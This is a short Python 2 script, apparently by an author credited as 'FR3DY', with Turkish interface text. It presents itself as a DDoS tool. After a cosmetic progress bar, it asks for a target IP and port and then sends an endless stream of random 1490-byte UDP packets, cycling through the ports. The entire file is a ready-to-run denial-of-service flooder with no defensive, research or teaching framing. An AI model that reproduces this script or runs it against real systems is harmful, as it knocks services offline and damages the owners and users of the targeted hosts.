import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet FR3DY DDos Attack")
print
print "Yazan   : FR3DY"
print "YouTube : https://www.youtube.com/c/FR3DY"
print "Github   : https://github.com/D4RK-FR3DY"
print "Instagram : https://www.instagram.com/x_fr3dy"
print
ip = raw_input("Site IP : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Seri Katil")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print " Web Adresi'ne %s Packet %s Sevk Ediliyor: %s"%(sent,ip,port)
     if port == 65534:
       port = 1

